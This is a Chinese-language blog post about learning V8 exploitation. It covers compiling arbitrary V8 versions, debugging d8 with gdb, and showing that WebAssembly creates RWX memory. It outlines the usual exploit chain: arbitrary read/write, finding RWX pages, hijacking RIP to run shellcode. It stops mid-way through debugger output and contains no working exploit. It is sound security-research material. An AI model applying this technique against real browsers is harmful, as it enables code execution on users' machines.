@@ -1,0 +1,1401 @@
+---
+layout: post
+title:  v8 Learn
+date:   2023-07-29 00:08:01 +0300
+image:  2023-07-29-sad.jpg
+tags:   [note,v8]
+---
+
+# 环境搭建
+
+下面就来详细说明编译v8环境的过程：
+
+1. 首先装好相关依赖: `sudo apt install bison cdbs curl flex g++ git python vim pkg-config`
+2. 获取depot_tools: `git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git`
+3. 设置depot_tools的环境变量: `echo "export PATH=$(pwd)/depot_tools:${PATH}" >> ~/.zshrc`
+4. 运行`fetch v8`， 这个命令会把v8克隆下来，v8挺大的，所以这个命令的速度视网络情况而定
+5. 安装v8相关的依赖，字体依赖就算用代理也会遇到一些网络问题，但是我目前没有研究字体类的漏洞，我就没有去解决这个问题，所以直接不装字体的依赖：`./v8/build/install-build-deps.sh --no-chromeos-fonts`
+
+以上算通用步骤，也就是不管什么版本，上面的命令执行一次就好了。
+
+网上的环境搭建的教程里面，之后应该就是执行：
+
+```assembly
+$ cd v8
+$ gclient sync
+$ gn gen out/x64.release --args='v8_monolithic=true v8_use_external_startup_data=false is_component_build=false is_debug=false target_cpu="x64" use_goma=false goma_dir="None" v8_enable_backtrace=true v8_enable_disassembler=true v8_enable_object_print=true v8_enable_verify_heap=true'
+ninja -C out/x64.release d8
+```
+
+如果编译出来的v8环境需要迁移，建议设置`v8_monolithic=true`，这样只需要迁移一个`d8`程序就好了。要不然还得迁移其他(snapshot)依赖。
+
+上面是编译最新版环境运行的命令，不过我是需要编译任意版本的，所以我把第二阶段的内容写成了一个`build.sh`脚本：
+
+```assembly
+$ cat build.sh
+#!/bin/bash
+VER=$1
+if [ -z $2 ];then
+        NAME=$VER
+else
+        NAME=$2
+fi
+cd v8
+git reset --hard $VER
+gclient sync -D
+gn gen out/x64_$NAME.release --args='v8_monolithic=true v8_use_external_startup_data=false is_component_build=false is_debug=false target_cpu="x64" use_goma=false goma_dir="None" v8_enable_backtrace=true v8_enable_disassembler=true v8_enable_object_print=true v8_enable_verify_heap=true'
+ninja -C out/x64_$NAME.release d8
+```
+
+以下是我运行一次该脚本的时间：
+
+```assembly
+$ time ./build.sh "9.6.180.6"
+HEAD is now at 67eacd3dce Version 9.6.180.6
+Syncing projects: 100% (29/29), done.
+Running hooks: 100% (27/27), done.
+Done. Made 178 targets from 98 files in 244ms
+ninja: Entering directory `out/x64_9.6.180.6.release'
+[1839/1839] LINK ./d8
+./build.sh "9.6.180.6"  4581.36s user 691.20s system 1586% cpu 5:32.41 total
+```
+
+然后是我修改过后的`Makefile`:
+
+```assembly
+$ cat Makefile 
+TAG:=$(tag)
+IMAGE:=hcamael/v8
+
+default: help
+
+help:
+    @echo 'V8/D8 ${TAG} Docker image build file'
+    @echo
+    @echo 'Usage:'
+    @echo '    make clean           Delete dangling images and d8 images'
+    @echo '    make build           Build the d8 image using local Dockerfile'
+    @echo '    make push            Push an existing image to Docker Hub'
+    @echo '    make deploy          Clean, build and push image to Docker Hub'
+    @echo '    make github          Tag the project in GitHub'
+    @echo
+
+build:
+    docker build --build-arg V8_VERSION=${TAG} -t ${IMAGE}:${TAG} .
+
+clean:
+    # Remove containers with exited status:
+    docker rm `docker ps -a -f status=exited -q` || true
+    docker rmi ${IMAGE}:latest || true
+    docker rmi ${IMAGE}:${TAG} || true
+    # Delete dangling images
+    docker rmi `docker images -f dangling=true -q` || true
+
+push:
+    docker push docker.io/${IMAGE}:${TAG}
+    docker tag ${IMAGE}:${TAG} docker.io/${IMAGE}:latest
+    docker push docker.io/${IMAGE}:latest
+
+deploy: clean build push
+
+github:
+    git push
+    git tag -a ${TAG} -m 'Version ${TAG}'
+    git push origin --tags
+
+
+.PHONY: help build clean push deploy github
+```
+
+然后是修改过后的`Dockerfile`：
+
+```assembly
+$ cat Dockerfile
+FROM debian:stable-slim
+
+RUN sed -i 's/deb.debian.org/mirrors.ustc.edu.cn/g' /etc/apt/sources.list
+RUN apt-get update && apt-get upgrade -yqq && \
+    DEBIAN_FRONTEND=noninteractive apt-get install curl rlwrap vim -yqq gdb && \
+    apt-get clean
+ARG V8_VERSION=latest
+ENV V8_VERSION=$V8_VERSION
+
+LABEL v8.version=$V8_VERSION \
+      maintainer="test@admin.com"
+WORKDIR /v8
+
+COPY /v8_$V8_VERSION/d8 ./
+
+COPY vimrc /root/.vimrc
+
+COPY entrypoint.sh /
+
+RUN chmod +x /entrypoint.sh && \
+    mkdir /examples && \
+    ln -s /v8/d8 /usr/local/bin/d8
+
+ENTRYPOINT ["/entrypoint.sh"]
+```
+
+# V8 通用利用链
+
+### v8的对象结构
+
+和vb等语言的解析类似，JavaScript是一种解释执行语言，v8本质上是一个JavaScript的解释执行程序。
+
+首先，需要了解v8解析执行JavaScript语句的基本流程：v8在读取js语句后，首先将这一条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。
+
+为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阀值后，就会将这段语法树直接转换为机器码。后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为ByteCode字节码，这样就大大加快了执行速度。这就是著名的JIT优化。
+
+这样的性能优化，虽然加快了程序的执行，但也带了很多安全问题。如果v8本来通过JIT引擎为某段语法树比如a+b加法计算生成了一段机器码`add eax,ebx`，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出来这个改变，这就造成了a和b对象在加法运算时的类型混淆。JIT的漏洞利用后续会专门总结。
+
+在v8利用上，也有一个明确的目标，就是执行任意`shellcode`。当有了这个目标后，下一步就是思考，怎么写`shellcode`呢？那么就需要有写内存相关的洞，能写到可读可写可执行的内存段，最好是能任意地址写。配套的还需要有任意读，因为需要知道rwx内存段的地址。就算没有任意读，也需要有办法能把改地址泄漏出来（V8的binary保护基本是全开的）。接下来就是需要能控制RIP，能让RIP跳转到`shellcode`的内存段。
+
+## 调试V8程序
+
+在总结v8的利用之前，先简单说说v8的调试。
+
+1.把该文件`v8/tools/gdbinit`，加入到`~/.gdbinit`中：
+
+```assembly
+$ cp v8/tools/gdbinit gdbinit_v8
+$ cat ~/.gdbinit
+source /home/ubuntu/pwndbg/gdbinit.py
+source /home/ubuntu/gdbinit_v8
+```
+
+2.使用`%DebugPrint(x);`来输出变量x的相关信息
+
+3.使用`%SystemBreak();`来抛出`int3`，以便让gdb进行调试
+
+### 示例
+
+```assembly
+$ cat test.js
+a = [1];
+%DebugPrint(a);
+%SystemBreak();
+```
+
+如果直接使用d8运行，会报错：
+
+```assembly
+$ ./d8 test.js
+test.js:2: SyntaxError: Unexpected token '%'
+%DebugPrint(a);
+^
+SyntaxError: Unexpected token '%'
+```
+
+因为正常情况下，js是没有`%`这种语法的，需要加入`--allow-natives-syntax`参数：
+
+```assembly
+$ ./d8 --allow-natives-syntax test.js
+DebugPrint: 0x3f9008049679: [JSArray]
+ - map: 0x3f9008203a41 <Map(PACKED_SMI_ELEMENTS)> [FastProperties]
+ - prototype: 0x3f90081cc139 <JSArray[0]>
+ - elements: 0x3f90081d30d1 <FixedArray[1]> [PACKED_SMI_ELEMENTS (COW)]
+ - length: 1
+ - properties: 0x3f900800222d <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x3f9008004905: [String] in ReadOnlySpace: #length: 0x3f900814215d <AccessorInfo> (const accessor descriptor), location: descriptor
+ }
+ - elements: 0x3f90081d30d1 <FixedArray[1]> {
+           0: 1
+ }
+0x3f9008203a41: [Map]
+ - type: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_SMI_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x3f90080023b5 <undefined>
+ - prototype_validity cell: 0x3f9008142405 <Cell value= 1>
+ - instance descriptors #1: 0x3f90081cc5ed <DescriptorArray[1]>
+ - transitions #1: 0x3f90081cc609 <TransitionArray[4]>Transition array #1:
+     0x3f9008005245 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_SMI_ELEMENTS) -> 0x3f9008203ab9 <Map(HOLEY_SMI_ELEMENTS)>
+
+ - prototype: 0x3f90081cc139 <JSArray[0]>
+ - constructor: 0x3f90081cbed5 <JSFunction Array (sfi = 0x3f900814ad71)>
+ - dependent code: 0x3f90080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
+ - construction counter: 0
+
+Trace/breakpoint trap (core dumped)
+```
+
+接下来试试使用gdb来调试该程序：
+
+```assembly
+$ gdb d8
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ../v8/out/x64_9.3.345.16.release/d8...
+(No debugging symbols found in ../v8/out/x64_9.3.345.16.release/d8)
+gdb-peda$ r --allow-natives-syntax test.js
+Starting program: /home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8 --allow-natives-syntax test.js
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7ff0a4c48640 (LWP 5366)]
+DebugPrint: 0x39700804968d: [JSArray]
+ - map: 0x397008203a41 <Map(PACKED_SMI_ELEMENTS)> [FastProperties]
+ - prototype: 0x3970081cc139 <JSArray[0]>
+ - elements: 0x3970081d30d1 <FixedArray[1]> [PACKED_SMI_ELEMENTS (COW)]
+ - length: 1
+ - properties: 0x39700800222d <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x397008004905: [String] in ReadOnlySpace: #length: 0x39700814215d <AccessorInfo> (const accessor descriptor), location: descriptor
+ }
+ - elements: 0x3970081d30d1 <FixedArray[1]> {
+           0: 1
+ }
+0x397008203a41: [Map]
+ - type: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_SMI_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x3970080023b5 <undefined>
+ - prototype_validity cell: 0x397008142405 <Cell value= 1>
+ - instance descriptors #1: 0x3970081cc5ed <DescriptorArray[1]>
+ - transitions #1: 0x3970081cc609 <TransitionArray[4]>Transition array #1:
+     0x397008005245 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_SMI_ELEMENTS) -> 0x397008203ab9 <Map(HOLEY_SMI_ELEMENTS)>
+
+ - prototype: 0x3970081cc139 <JSArray[0]>
+ - constructor: 0x3970081cbed5 <JSFunction Array (sfi = 0x39700814ad71)>
+ - dependent code: 0x3970080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
+ - construction counter: 0
+
+
+Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
+Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled off'.
+
+Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled on'.
+
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x56288ce89130 --> 0x7ffdd1e16ea0 (0x000056288ce89130)
+RCX: 0x56288c5963e0 (<Builtins_CallRuntimeHandler>:	push   rbp)
+RDX: 0x56288ce89130 --> 0x7ffdd1e16ea0 (0x000056288ce89130)
+RSI: 0x7ffdd1e15e30 --> 0x3970080023b5 --> 0x80023 
+RDI: 0x0 
+RBP: 0x7ffdd1e15da0 --> 0x7ffdd1e15dd0 --> 0x7ffdd1e15df8 --> 0x7ffdd1e15e18 --> 0x7ffdd1e15e60 --> 0x7ffdd1e15e88 (--> ...)
+RSP: 0x7ffdd1e15da0 --> 0x7ffdd1e15dd0 --> 0x7ffdd1e15df8 --> 0x7ffdd1e15e18 --> 0x7ffdd1e15e60 --> 0x7ffdd1e15e88 (--> ...)
+RIP: 0x56288c621445 (<_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp)
+R8 : 0x3970081c3649 --> 0xd900000200082021 
+R9 : 0x31 ('1')
+R10: 0x0 
+R11: 0xfffffffffffffffa 
+R12: 0x56288cf20670 --> 0x397008206fb1 --> 0xbd11050505080021 
+R13: 0x56288ce89130 --> 0x7ffdd1e16ea0 (0x000056288ce89130)
+R14: 0x397000000000 --> 0x15000 
+R15: 0x56288cf22170 --> 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x56288c621440 <_ZN2v84base2OS10DebugBreakEv>:	push   rbp
+   0x56288c621441 <_ZN2v84base2OS10DebugBreakEv+1>:	mov    rbp,rsp
+   0x56288c621444 <_ZN2v84base2OS10DebugBreakEv+4>:	int3   
+=> 0x56288c621445 <_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp
+   0x56288c621446 <_ZN2v84base2OS10DebugBreakEv+6>:	ret    
+   0x56288c621447:	int3   
+   0x56288c621448:	int3   
+   0x56288c621449:	int3
+[------------------------------------stack-------------------------------------]
+0000| 0x7ffdd1e15da0 --> 0x7ffdd1e15dd0 --> 0x7ffdd1e15df8 --> 0x7ffdd1e15e18 --> 0x7ffdd1e15e60 --> 0x7ffdd1e15e88 (--> ...)
+0008| 0x7ffdd1e15da8 --> 0x56288bf3e4b5 (<_ZN2v88internal19Runtime_SystemBreakEiPmPNS0_7IsolateE+53>:	mov    r14,QWORD PTR [rbx+0xa0])
+0016| 0x7ffdd1e15db0 --> 0x56288bf3e480 (<_ZN2v88internal19Runtime_SystemBreakEiPmPNS0_7IsolateE>:	push   rbp)
+0024| 0x7ffdd1e15db8 --> 0x0 
+0032| 0x7ffdd1e15dc0 --> 0x397000000000 --> 0x15000 
+0040| 0x7ffdd1e15dc8 --> 0x7ffdd1e15e30 --> 0x3970080023b5 --> 0x80023 
+0048| 0x7ffdd1e15dd0 --> 0x7ffdd1e15df8 --> 0x7ffdd1e15e18 --> 0x7ffdd1e15e60 --> 0x7ffdd1e15e88 --> 0x7ffdd1e15ef0 (--> ...)
+0056| 0x7ffdd1e15dd8 --> 0x56288c505db3 (<Builtins_CEntry_Return1_DontSaveFPRegs_ArgvInRegister_NoBuiltinExit+51>:	cmp    eax,DWORD PTR [r13+0x180])
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGTRAP
+0x000056288c621445 in v8::base::OS::DebugBreak() ()
+```
+
+然后就能使用gdb命令来查看其内存布局了，另外在之前v8提供的gdbinit中，加入了一些辅助调试的命令，比如`job`，作用跟`%DebufPrint`差不多：
+
+```assembly
+gdb-peda$ job 0x39700804968d
+0x39700804968d: [JSArray]
+ - map: 0x397008203a41 <Map(PACKED_SMI_ELEMENTS)> [FastProperties]
+ - prototype: 0x3970081cc139 <JSArray[0]>
+ - elements: 0x3970081d30d1 <FixedArray[1]> [PACKED_SMI_ELEMENTS (COW)]
+ - length: 1
+ - properties: 0x39700800222d <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x397008004905: [String] in ReadOnlySpace: #length: 0x39700814215d <AccessorInfo> (const accessor descriptor), location: descriptor
+ }
+ - elements: 0x3970081d30d1 <FixedArray[1]> {
+           0: 1
+ }
+```
+
+不过使用job命令的时候，其地址要是其真实地址+1，也就是说，在上面的样例中，其真实地址为：`0x39700804968c`：
+
+```assembly
+gdb-peda$ x/4gx 0x39700804968d-1
+0x39700804968c:	0x0800222d08203a41	0x00000002081d30d1
+0x39700804969c:	0x0000000000000000	0x0000000000000000
+```
+
+如果使用job命令，后面跟着的是其真实地址，会被解析成SMI（small integer）类型：
+
+```assembly
+gdb-peda$ job 0x39700804968d-1
+Smi: 0x4024b46 (67259206)
+```
+
+`0x4024b46 * 2 == 0x804968c` (SMI只有32bit)
+
+对d8进行简单的调试只要知道这么多就够了。
+
+### WASM
+
+现如今的浏览器基本都支持WASM，v8会专门生成一段rwx内存供WASM使用，这就给了我们利用的机会。
+
+我们来调试看看：
+
+测试代码：
+
+```assembly
+$ cat test.js
+%SystemBreak();
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+var f = wasmInstance.exports.main;
+%DebugPrint(f);
+%DebugPrint(wasmInstance);
+%SystemBreak();
+```
+
+然后使用gdb进行调试，在第一个断点的时候，使用`vmmap`来查看一下内存段
+
+```assembly
+yqw@yqw-virtual-machine:~/Documents/v8/learn$ gdb ../v8/out/x64_9.3.345.16.release/d8
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ../v8/out/x64_9.3.345.16.release/d8...
+(No debugging symbols found in ../v8/out/x64_9.3.345.16.release/d8)
+gdb-peda$ r --allow-natives-syntax test.js
+Starting program: /home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8 --allow-natives-syntax test.js
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7f13e5e48640 (LWP 5464)]
+
+Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
+Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled off'.
+
+Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled on'.
+
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x55ce33dfe130 --> 0x7fffa54f51c0 (0x000055ce33dfe130)
+RCX: 0x55ce32da53e0 (<Builtins_CallRuntimeHandler>:	push   rbp)
+RDX: 0x55ce33dfe130 --> 0x7fffa54f51c0 (0x000055ce33dfe130)
+RSI: 0x7fffa54f4150 --> 0x12f2080023b5 --> 0x80023 
+RDI: 0x0 
+RBP: 0x7fffa54f40b0 --> 0x7fffa54f40e0 --> 0x7fffa54f4108 --> 0x7fffa54f4128 --> 0x7fffa54f4180 --> 0x7fffa54f41a8 (--> ...)
+RSP: 0x7fffa54f40b0 --> 0x7fffa54f40e0 --> 0x7fffa54f4108 --> 0x7fffa54f4128 --> 0x7fffa54f4180 --> 0x7fffa54f41a8 (--> ...)
+RIP: 0x55ce32e30445 (<_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp)
+R8 : 0x12f2081c3649 --> 0xd900000200082021 
+R9 : 0x2c (',')
+R10: 0x55ce33e95718 --> 0x12f2081d3435 --> 0xc0081d30ad080026 
+R11: 0xfffffffffffffffa 
+R12: 0x55ce33e95670 --> 0x12f2081d0ccd --> 0x2d08042fdd08206f 
+R13: 0x55ce33dfe130 --> 0x7fffa54f51c0 (0x000055ce33dfe130)
+R14: 0x12f200000000 --> 0x15000 
+R15: 0x55ce33e97170 --> 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x55ce32e30440 <_ZN2v84base2OS10DebugBreakEv>:	push   rbp
+   0x55ce32e30441 <_ZN2v84base2OS10DebugBreakEv+1>:	mov    rbp,rsp
+   0x55ce32e30444 <_ZN2v84base2OS10DebugBreakEv+4>:	int3   
+=> 0x55ce32e30445 <_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp
+   0x55ce32e30446 <_ZN2v84base2OS10DebugBreakEv+6>:	ret    
+   0x55ce32e30447:	int3   
+   0x55ce32e30448:	int3   
+   0x55ce32e30449:	int3
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffa54f40b0 --> 0x7fffa54f40e0 --> 0x7fffa54f4108 --> 0x7fffa54f4128 --> 0x7fffa54f4180 --> 0x7fffa54f41a8 (--> ...)
+0008| 0x7fffa54f40b8 --> 0x55ce3274d4b5 (<_ZN2v88internal19Runtime_SystemBreakEiPmPNS0_7IsolateE+53>:	mov    r14,QWORD PTR [rbx+0xa0])
+0016| 0x7fffa54f40c0 --> 0x55ce3274d480 (<_ZN2v88internal19Runtime_SystemBreakEiPmPNS0_7IsolateE>:	push   rbp)
+0024| 0x7fffa54f40c8 --> 0x0 
+0032| 0x7fffa54f40d0 --> 0x12f200000000 --> 0x15000 
+0040| 0x7fffa54f40d8 --> 0x7fffa54f4150 --> 0x12f2080023b5 --> 0x80023 
+0048| 0x7fffa54f40e0 --> 0x7fffa54f4108 --> 0x7fffa54f4128 --> 0x7fffa54f4180 --> 0x7fffa54f41a8 --> 0x7fffa54f4210 (--> ...)
+0056| 0x7fffa54f40e8 --> 0x55ce32d14db3 (<Builtins_CEntry_Return1_DontSaveFPRegs_ArgvInRegister_NoBuiltinExit+51>:	cmp    eax,DWORD PTR [r13+0x180])
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGTRAP
+0x000055ce32e30445 in v8::base::OS::DebugBreak() ()
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x000012f200000000 0x000012f200003000 rw-p	mapped
+0x000012f200003000 0x000012f200004000 ---p	mapped
+0x000012f200004000 0x000012f200014000 r-xp	mapped
+0x000012f200014000 0x000012f20003f000 ---p	mapped
+0x000012f20003f000 0x000012f208000000 ---p	mapped
+0x000012f208000000 0x000012f208021000 r--p	mapped
+0x000012f208021000 0x000012f208040000 ---p	mapped
+0x000012f208040000 0x000012f20814d000 rw-p	mapped
+0x000012f20814d000 0x000012f208180000 ---p	mapped
+0x000012f208180000 0x000012f208183000 rw-p	mapped
+0x000012f208183000 0x000012f2081c0000 ---p	mapped
+0x000012f2081c0000 0x000012f208240000 rw-p	mapped
+0x000012f208240000 0x000012f300000000 ---p	mapped
+0x000055ce3193d000 0x000055ce321a5000 r--p	/home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8
+0x000055ce321a5000 0x000055ce32fb5000 r-xp	/home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8
+0x000055ce32fb5000 0x000055ce3301d000 r--p	/home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8
+0x000055ce3301d000 0x000055ce3302e000 rw-p	/home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8
+0x000055ce3302e000 0x000055ce33058000 rw-p	mapped
+0x000055ce33df8000 0x000055ce33ed5000 rw-p	[heap]
+0x00007f13e5648000 0x00007f13e5649000 ---p	mapped
+0x00007f13e5649000 0x00007f13e6800000 rw-p	mapped
+0x00007f13e6800000 0x00007f13e6828000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e6828000 0x00007f13e69bd000 r-xp	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e69bd000 0x00007f13e6a15000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e6a15000 0x00007f13e6a19000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e6a19000 0x00007f13e6a1b000 rw-p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e6a1b000 0x00007f13e6a28000 rw-p	mapped
+0x00007f13e6aa3000 0x00007f13e6aa7000 rw-p	mapped
+0x00007f13e6aa7000 0x00007f13e6aaa000 r--p	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6aaa000 0x00007f13e6ac1000 r-xp	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6ac1000 0x00007f13e6ac5000 r--p	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6ac5000 0x00007f13e6ac6000 r--p	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6ac6000 0x00007f13e6ac7000 rw-p	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6ac7000 0x00007f13e6ad5000 r--p	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6ad5000 0x00007f13e6b51000 r-xp	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6b51000 0x00007f13e6bac000 r--p	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6bac000 0x00007f13e6bad000 r--p	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6bad000 0x00007f13e6bae000 rw-p	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6bae000 0x00007f13e6baf000 r--p	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6baf000 0x00007f13e6bb0000 r-xp	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6bb0000 0x00007f13e6bb1000 r--p	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6bb1000 0x00007f13e6bb2000 r--p	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6bb2000 0x00007f13e6bb3000 rw-p	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6bb3000 0x00007f13e6bb4000 r--p	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bb4000 0x00007f13e6bb5000 r-xp	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bb5000 0x00007f13e6bb6000 r--p	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bb6000 0x00007f13e6bb7000 r--p	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bb7000 0x00007f13e6bb8000 rw-p	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bc7000 0x00007f13e6bc9000 rw-p	mapped
+0x00007f13e6bc9000 0x00007f13e6bcb000 r--p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007f13e6bcb000 0x00007f13e6bf5000 r-xp	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007f13e6bf5000 0x00007f13e6c00000 r--p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007f13e6c01000 0x00007f13e6c03000 r--p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007f13e6c03000 0x00007f13e6c05000 rw-p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007fffa54d7000 0x00007fffa54f8000 rw-p	[stack]
+0x00007fffa5589000 0x00007fffa558d000 r--p	[vvar]
+0x00007fffa558d000 0x00007fffa558f000 r-xp	[vdso]
+0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
+```
+
+这个时候内存中是不存在可读可写可执行的内存断的，我们让程序继续运行。
+
+在第二个断点的时候，我们再运行一次`vmmap`来查看内存段：
+
+```assembly
+gdb-peda$ c
+Continuing.
+DebugPrint: 0x12f2081d3645: [Function] in OldSpace
+ - map: 0x12f2082049e1 <Map(HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x12f2081c3b5d <JSFunction (sfi = 0x12f20814414d)>
+ - elements: 0x12f20800222d <FixedArray[0]> [HOLEY_ELEMENTS]
+ - function prototype: <no-prototype-slot>
+ - shared_info: 0x12f2081d3621 <SharedFunctionInfo js-to-wasm::i>
+ - name: 0x12f2080051c5 <String[1]: #0>
+ - builtin: GenericJSToWasmWrapper
+ - formal_parameter_count: 0
+ - kind: NormalFunction
+ - context: 0x12f2081c3649 <NativeContext[256]>
+ - code: 0x12f20000b3a1 <Code BUILTIN GenericJSToWasmWrapper>
+ - Wasm instance: 0x12f2081d3509 <Instance map = 0x12f208207439>
+ - Wasm function index: 0
+ - properties: 0x12f20800222d <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x12f208004905: [String] in ReadOnlySpace: #length: 0x12f208142339 <AccessorInfo> (const accessor descriptor), location: descriptor
+    0x12f208004a35: [String] in ReadOnlySpace: #name: 0x12f2081422f5 <AccessorInfo> (const accessor descriptor), location: descriptor
+    0x12f208004029: [String] in ReadOnlySpace: #arguments: 0x12f20814226d <AccessorInfo> (const accessor descriptor), location: descriptor
+    0x12f208004245: [String] in ReadOnlySpace: #caller: 0x12f2081422b1 <AccessorInfo> (const accessor descriptor), location: descriptor
+ }
+ - feedback vector: feedback metadata is not available in SFI
+0x12f2082049e1: [Map]
+ - type: JS_FUNCTION_TYPE
+ - instance size: 28
+ - inobject properties: 0
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - callable
+ - back pointer: 0x12f2080023b5 <undefined>
+ - prototype_validity cell: 0x12f208142405 <Cell value= 1>
+ - instance descriptors (own) #4: 0x12f2081d0735 <DescriptorArray[4]>
+ - prototype: 0x12f2081c3b5d <JSFunction (sfi = 0x12f20814414d)>
+ - constructor: 0x12f208002235 <null>
